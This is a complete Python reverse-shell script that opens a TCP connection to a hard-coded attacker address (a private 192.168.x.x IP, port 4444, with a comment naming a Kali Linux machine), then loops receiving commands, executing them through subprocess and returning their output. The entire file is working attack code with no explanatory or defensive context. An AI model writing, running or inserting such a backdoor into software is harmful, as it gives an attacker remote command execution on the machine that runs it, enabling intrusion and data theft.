import socket
import subprocess

def connect():
    # Change these values to your Kali Linux machine's IP address and port
    host = "192.168.159.130"
    port = 4444

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        while True:
            # Receive command from the attacker machine
            command = s.recv(1024).decode()

            # Execute the command and send output back to the attacker machine
            if command.lower() == "exit":
                break
            output = subprocess.getoutput(command)
            s.send(output.encode())
    except Exception as e:
        print("Error:", e)
    finally:
        s.close()

if __name__ == "__main__":
    connect()
